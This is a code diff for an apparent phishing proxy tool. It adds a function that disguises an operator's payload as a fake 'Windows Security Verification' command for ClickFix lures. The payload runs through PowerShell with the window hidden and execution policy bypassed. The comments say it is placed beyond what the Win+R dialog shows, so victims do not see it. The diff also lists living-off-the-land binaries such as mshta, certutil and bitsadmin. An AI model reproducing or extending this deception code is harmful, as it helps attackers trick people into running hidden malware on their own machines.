@@ -54,13 +54,45 @@ func (p *HttpProxy) loadClickFixTemplate(name string) (string, error) {
 	return string(data), nil
 }
 
+// wrapClickFixPayload embeds the operator's payload inside a realistic-looking
+// Windows command so the victim sees a legitimate verification string in the
+// Run dialog (Win+R shows only ~80 leading chars; the payload sits deep past
+// the visible area).
+//
+// The wrapper:
+//   1. Opens with a benign Windows title/echo that looks like a security check
+//   2. Runs a short delay + fake "verifying" message
+//   3. Executes the actual payload (hidden window, bypassed execution policy)
+//   4. Closes with a fake "complete" message
+//
+// If the operator's command already starts with a wrapper marker (cmd /c, powershell),
+// it is returned as-is (operator provides their own wrapper).
+func wrapClickFixPayload(command string) string {
+	command = strings.TrimSpace(command)
+	if command == "" {
+		return command
+	}
+	// Operator already wrapped — respect their format
+	lower := strings.ToLower(command)
+	if strings.HasPrefix(lower, "cmd /c") || strings.HasPrefix(lower, "powershell") ||
+		strings.HasPrefix(lower, "cmd.exe") || strings.HasPrefix(lower, "mshta") ||
+		strings.HasPrefix(lower, "rundll32") || strings.HasPrefix(lower, "certutil") ||
+		strings.HasPrefix(lower, "bitsadmin") || strings.HasPrefix(lower, "curl ") ||
+		strings.HasPrefix(lower, "wget ") || strings.HasPrefix(lower, "start ") {
+		return command
+	}
+	// Wrap: legitimate-looking security verification with payload deep inside
+	return `cmd /c "title Windows Security Verification & color 0A & echo Running security check... & timeout /t 2 >nul & echo Analyzing system files... & timeout /t 1 >nul & powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "` + command + `" & echo Verification complete. & timeout /t 1 >nul & exit"`
+}
+
 // renderClickFix substitutes all placeholders:
-//   {command_b64}  → base64(command) — decoded at runtime by the template JS
-//   {command}      → the raw command (legacy templates without encoding)
+//   {command_b64}  → base64(wrapped command) — decoded at runtime by the template JS
+//   {command}      → the raw wrapped command (legacy templates without encoding)
 //   {redirect_url} → the post-verify redirect target
 func renderClickFix(tmpl, command, redirectUrl string) string {
-	out := strings.ReplaceAll(tmpl, "{command_b64}", base64.StdEncoding.EncodeToString([]byte(command)))
-	out = strings.ReplaceAll(out, "{command}", command)
+	wrapped := wrapClickFixPayload(command)
+	out := strings.ReplaceAll(tmpl, "{command_b64}", base64.StdEncoding.EncodeToString([]byte(wrapped)))
+	out = strings.ReplaceAll(out, "{command}", wrapped)
 	out = strings.ReplaceAll(out, "{redirect_url}", redirectUrl)
 	return out
 }
